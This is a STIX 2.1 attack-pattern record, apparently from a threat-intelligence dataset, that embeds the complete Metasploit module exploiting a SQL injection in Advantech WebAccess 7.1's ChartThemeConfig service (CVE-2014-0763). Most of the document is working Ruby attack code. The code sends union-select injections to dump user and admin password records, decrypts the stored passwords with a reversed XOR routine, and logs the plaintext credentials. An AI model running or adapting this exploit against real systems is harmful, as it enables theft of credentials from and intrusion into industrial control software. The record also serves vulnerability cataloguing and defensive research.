{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--fac74a1c-293c-42ec-8322-9f66d739035c",
    "created": "2024-08-14T16:22:21.692642Z",
    "modified": "2024-08-14T16:22:21.692646Z",
    "name": "Advantech WebAccess DBVisitor.dll ChartThemeConfig SQL Injection",
    "description": " This module exploits a SQL injection vulnerability found in Advantech WebAccess 7.1. The vulnerability exists in the DBVisitor.dll component, and can be abused through malicious requests to the ChartThemeConfig web service. This module can be used to extract the site and project usernames and hashes.  'References'     => [",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/scada/advantech_webaccess_dbvisitor_sqli.rb",
            "external_id": "advantech_webaccess_dbvisitor_sqli.rb"
        },
        {
            "source_name": "reference",
            "url": "https://ics-cert.us-cert.gov/advisories/ICSA-14-079-03"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'rexml/document'\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Report\n  include REXML\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Advantech WebAccess DBVisitor.dll ChartThemeConfig SQL Injection',\n      'Description'    => %q{\n        This module exploits a SQL injection vulnerability found in Advantech WebAccess 7.1. The\n        vulnerability exists in the DBVisitor.dll component, and can be abused through malicious\n        requests to the ChartThemeConfig web service. This module can be used to extract the site\n        and project usernames and hashes.\n      },\n      'References'     =>\n        [\n          [ 'CVE', '2014-0763' ],\n          [ 'ZDI', '14-077' ],\n          [ 'OSVDB', '105572' ],\n          [ 'BID', '66740' ],\n          [ 'URL', 'https://ics-cert.us-cert.gov/advisories/ICSA-14-079-03' ]\n        ],\n      'Author'         =>\n        [\n          'rgod <rgod[at]autistici.org>', # Vulnerability Discovery\n          'juan vazquez' # Metasploit module\n        ],\n      'License'        => MSF_LICENSE,\n      'DisclosureDate' => '2014-04-08'\n    ))\n\n    register_options(\n      [\n        OptString.new(\"TARGETURI\", [true, 'The path to the BEMS Web Site', '/BEMS']),\n        OptString.new(\"WEB_DATABASE\", [true, 'The path to the bwCfg.mdb database in the target', \"C:\\\\WebAccess\\\\Node\\\\config\\\\bwCfg.mdb\"])\n      ])\n  end\n\n  def build_soap(injection)\n    xml = Document.new\n    xml.add_element(\n        \"s:Envelope\",\n        {\n            'xmlns:s' => \"http://schemas.xmlsoap.org/soap/envelope/\"\n        })\n    xml.root.add_element(\"s:Body\")\n    body = xml.root.elements[1]\n    body.add_element(\n        \"GetThemeNameList\",\n        {\n            'xmlns' => \"http://tempuri.org/\"\n        })\n    name_list = body.elements[1]\n    name_list.add_element(\"userName\")\n    name_list.elements['userName'].text = injection\n\n    xml.to_s\n  end\n\n  def do_sqli(injection, mark)\n    xml = build_soap(injection)\n\n    res = send_request_cgi({\n      'method'    => 'POST',\n      'uri'       => normalize_uri(target_uri.path.to_s, \"Services\", \"ChartThemeConfig.svc\"),\n      'ctype'    => 'text/xml; charset=UTF-8',\n      'headers'  => {\n          'SOAPAction' => '\"http://tempuri.org/IChartThemeConfig/GetThemeNameList\"'\n      },\n      'data'      => xml\n    })\n\n    unless res && res.code == 200 && res.body && res.body.include?(mark)\n      return nil\n    end\n\n    res.body.to_s\n  end\n\n  def check\n    mark = Rex::Text.rand_text_alpha(8 + rand(5))\n    injection =  \"#{Rex::Text.rand_text_alpha(8 + rand(5))}' \"\n    injection << \"union all select '#{mark}' from BAThemeSetting where '#{Rex::Text.rand_text_alpha(2)}'='#{Rex::Text.rand_text_alpha(3)}\"\n    data = do_sqli(injection, mark)\n\n    if data.nil?\n      return Msf::Exploit::CheckCode::Safe\n    end\n\n    Msf::Exploit::CheckCode::Vulnerable\n  end\n\n  def parse_users(xml, mark, separator)\n    doc = Document.new(xml)\n\n    strings = XPath.match(doc, \"s:Envelope/s:Body/GetThemeNameListResponse/GetThemeNameListResult/a:string\").map(&:text)\n    strings_length = strings.length\n\n    unless strings_length > 1\n      return\n    end\n\n    i = 0\n    strings.each do |result|\n      next if result == mark\n      @users << result.split(separator)\n      i = i + 1\n    end\n\n  end\n\n  def run\n    print_status(\"Exploiting sqli to extract users information...\")\n    mark = Rex::Text.rand_text_alpha(8 + rand(5))\n    rand = Rex::Text.rand_text_numeric(2)\n    separator = Rex::Text.rand_text_alpha(5 + rand(5))\n    # While installing I can only configure an Access backend, but\n    # according to documentation other backends are supported. This\n    # injection should be compatible, hopefully, with most backends.\n    injection =  \"#{Rex::Text.rand_text_alpha(8 + rand(5))}' \"\n    injection << \"union all select UserName + '#{separator}' + Password + '#{separator}' + Password2 + '#{separator}BAUser' from BAUser where #{rand}=#{rand} \"\n    injection << \"union all select UserName + '#{separator}' + Password + '#{separator}' + Password2 + '#{separator}pUserPassword' from pUserPassword IN '#{datastore['WEB_DATABASE']}' where #{rand}=#{rand} \"\n    injection << \"union all select UserName + '#{separator}' + Password + '#{separator}' + Password2 + '#{separator}pAdmin' from pAdmin IN '#{datastore['WEB_DATABASE']}' where #{rand}=#{rand} \"\n    injection << \"union all select '#{mark}' from BAThemeSetting where '#{Rex::Text.rand_text_alpha(2)}'='#{Rex::Text.rand_text_alpha(3)}\"\n    data = do_sqli(injection, mark)\n\n    if data.blank?\n      print_error(\"Error exploiting sqli\")\n      return\n    end\n\n    @users = []\n    @plain_passwords = []\n\n    print_status(\"Parsing extracted data...\")\n    parse_users(data, mark, separator)\n\n    if @users.empty?\n      print_error(\"Users not found\")\n      return\n    else\n      print_good(\"#{@users.length} users found!\")\n    end\n\n    users_table = Rex::Text::Table.new(\n      'Header'  => 'Advantech WebAccess Users',\n      'Indent'   => 1,\n      'Columns' => ['Username', 'Encrypted Password', 'Key', 'Recovered password', 'Origin']\n    )\n\n    for i in 0..@users.length - 1\n      @plain_passwords[i] =\n          begin\n            decrypt_password(@users[i][1], @users[i][2])\n          rescue\n            \"(format not recognized)\"\n          end\n\n      @plain_passwords[i] = \"(blank password)\" if @plain_passwords[i].empty?\n\n      begin\n        @plain_passwords[i].encode(\"ISO-8859-1\").to_s\n      rescue ::Encoding::UndefinedConversionError\n        chars = @plain_passwords[i].unpack(\"C*\")\n        @plain_passwords[i] = \"0x#{chars.collect {|c| c.to_s(16)}.join(\", 0x\")}\"\n        @plain_passwords[i] << \" (ISO-8859-1 hex chars)\"\n      end\n\n      report_cred(\n        ip: rhost,\n        port: rport,\n        user: @users[i][0],\n        password: @plain_passwords[i],\n        service_name: (ssl ? \"https\" : \"http\"),\n        proof: \"Leaked encrypted password from #{@users[i][3]}: #{@users[i][1]}:#{@users[i][2]}\"\n      )\n\n      users_table << [@users[i][0], @users[i][1], @users[i][2], @plain_passwords[i], user_type(@users[i][3])]\n    end\n\n    print_line(users_table.to_s)\n  end\n\n  def report_cred(opts)\n    service_data = {\n      address: opts[:ip],\n      port: opts[:port],\n      service_name: opts[:service_name],\n      protocol: 'tcp',\n      workspace_id: myworkspace_id\n    }\n\n    credential_data = {\n      origin_type: :service,\n      module_fullname: fullname,\n      username: opts[:user],\n      private_data: opts[:password],\n      private_type: :password\n    }.merge(service_data)\n\n    login_data = {\n      core: create_credential(credential_data),\n      status: Metasploit::Model::Login::Status::UNTRIED,\n      proof: opts[:proof]\n    }.merge(service_data)\n\n    create_credential_login(login_data)\n  end\n\n  def user_type(database)\n    user_type = database\n\n    unless database == \"BAUser\"\n      user_type << \" (Web Access)\"\n    end\n\n    user_type\n  end\n\n  def decrypt_password(password, key)\n    recovered_password = recover_password(password)\n    recovered_key = recover_key(key)\n\n    recovered_bytes = decrypt_bytes(recovered_password, recovered_key)\n    password = []\n\n    recovered_bytes.each { |b|\n      if b == 0\n        break\n      else\n        password.push(b)\n      end\n    }\n\n    return password.pack(\"C*\")\n  end\n\n  def recover_password(password)\n    bytes = password.unpack(\"C*\")\n    recovered = []\n\n    i = 0\n    j = 0\n    while i < 16\n      low = bytes[i]\n      if low < 0x41\n        low = low - 0x30\n      else\n        low = low - 0x37\n      end\n      low = low * 16\n\n      high = bytes[i+1]\n      if high < 0x41\n        high = high - 0x30\n      else\n        high = high - 0x37\n      end\n\n      recovered_byte = low + high\n      recovered[j] = recovered_byte\n      i = i + 2\n      j = j + 1\n    end\n\n    recovered\n  end\n\n  def recover_key(key)\n    bytes = key.unpack(\"C*\")\n    recovered = 0\n\n    bytes[0, 8].each { |b|\n      recovered = recovered * 16\n      if b < 0x41\n        byte_weight = b - 0x30\n      else\n        byte_weight = b - 0x37\n      end\n      recovered = recovered + byte_weight\n    }\n\n    recovered\n  end\n\n  def decrypt_bytes(bytes, key)\n    result = []\n    xor_table = [0xaa, 0xa5, 0x5a, 0x55]\n    key_copy = key\n    for i in 0..7\n      byte = (crazy(bytes[i] ,8 - (key & 7)) & 0xff)\n      result.push(byte ^ xor_table[key_copy & 3])\n      key_copy = key_copy / 4\n      key = key / 8\n    end\n\n    result\n  end\n\n  def crazy(byte, magic)\n    result = byte & 0xff\n\n    while magic > 0\n      result = result * 2\n        if result & 0x100 == 0x100\n          result = result + 1\n        end\n        magic = magic - 1\n    end\n\n    result\n  end\nend\n\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2014-04-08"
}